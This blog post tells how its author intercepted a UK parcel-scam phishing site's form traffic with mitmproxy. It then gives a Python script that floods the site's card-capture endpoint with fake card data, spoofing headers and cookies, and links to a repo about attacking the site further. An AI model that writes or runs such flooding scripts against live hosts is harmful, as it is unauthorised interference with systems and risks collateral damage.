---
title: Scamming back the scammers
slug: scamming-back-the-scammers
date: 2022-04-14T17:38:00.000Z
date_updated: 2022-04-14T17:38:00.000Z
summary: Recently got a scammy text, but now their database will bleed
---

Disclaimer: I do not accept any responsibility for your actions, what you do or decide not to, is up to you. This blog post serves as a “Here’s what I did” opposed to a “Here’s how to do it”

Without wasting more time, let’s get to it.

Recently I got one of the texts every citizen of the UK has got at some point in their life - A parcel has attempted to be delivered - Pay for it!

![](__GHOST_URL__/content/images/2022/04/IMG_6100.jpg)
Now here’s where they went wrong.

I have too much free time and unlimited internet.

I tried to browse to their site ([local-shipstatus-gb.com](http://local-shipstatus-gb.com)) but they’re doing something clever where if you try and come to it form anything other than a mobile phone - you get a 404
![](__GHOST_URL__/content/images/2022/04/shipondesktop.jpg)

No matter what I did, I was unable to figure out a way around this on a browser.

As you can see from the below page, you can see that it looks somewhat like a post office site, and requires some input

![](__GHOST_URL__/content/images/2022/04/IMG_6104.jpg)

Now stupidly I forgot to take a screen capture of this, but here’s what I did:

1. Installed mitmproxy to my Mac and started `mitmweb`
2. Installed the Certs on my phone
3. Set the phone to use the IP address of the Mac for a Proxy
4. Browsed to the page and filled it out with Fake Data.
5. Saved the capture

From there I found the calls it was making to the web server

    'form_type': 'cc', 'ccname': ‘Tess Tickle’, 'ccnum': ‘123’, 'ccexp': ’12/25’, 'cccvv': ‘123’

Now what’s cool (not for them I guess?) is that their application doesn’t seem to be validating the numbers on the application - They are being captured then validated.

We simply need to write a python script that spams their server with the below fields: 

    form_type : Name of the form
    ccname : Name on Credit Card number
    ccnum : Credit Card number
    ccexp : Expiry of the credit card
    cccvv : CVV of the Credit card

---

We have to URL encode this in python, so spaces become %20, the normal stuff.

I used: 

    requests
    urllib.parse

Here’s our next issue… How do we make fake data to spam these chumps with?

Here comes Faker!

    from faker import Faker <code block>

We need to fake: Name, credit card, expiration and CVV - All of these faker can do

    from faker import Faker
    fake = Faker()
    
    name = fake.name()
    cnum = fake.credit_card_number()
    cexp = fake.credit_card_expire()
    cvv = fake.credit_card_security_code()

Now all we need to do is use the user-agent from our phone, and then spam the living crap out of these low life scammers

Enter our for loop:

    for s in range(100):
    cookie = ("PHPSESSID=" + sessionrandom)
    url = f'https://local-shipstatus-gb.com/Finish.php?session={urlrandom}'
    name = fake.name()
    cnum = fake.credit_card_number()
    cexp = fake.credit_card_expire()
    cvv = fake.credit_card_security_code()
    # f = { 'username' : name, 'password' : cnum, 'client_id' : cexp, 'client_secret' : cvv}
    f = {'form_type': 'cc', 'ccname': name, 'ccnum': cnum, 'ccexp': cexp, 'cccvv': cvv}
    urllib.parse.urlencode(f)
    safe_string = urllib.parse.urlencode(f)
    
    payload = safe_string
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://local-shipstatus-gb.com',
    #  'cookie':'PHPSESSID=134ddeae9b576bc8daa0eb412ced6945',
    'cookie': cookie,
    'content-length': '72',
    'accept-language': 'en-GB,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15',
    # 'user-agent': agent,
    'referer': url,
    'accept-encoding': 'gzip, deflate, br'
    }
    
    response = requests.request("POST", url, headers=headers, data=payload)
    
    if response.status_code == 200:
    print("ok")
    elif response.status_code != 200:
    print(response.status_code)

If you want to read a full write up, and see how you could (not saying you should) launch an attach and their vulnerabilities:
[

GitHub - userbradley/fake-postoffice-spammer

Contribute to userbradley/fake-postoffice-spammer development by creating an account on GitHub.

![](https://github.githubassets.com/favicons/favicon.svg)GitHubuserbradley

![](https://opengraph.githubassets.com/0f1b4fa6e1bd7a3e0794c27bb6b334458e4993c864543cd9bd7ae4c414d6435f/userbradley/fake-postoffice-spammer)
](https://github.com/userbradley/fake-postoffice-spammer)
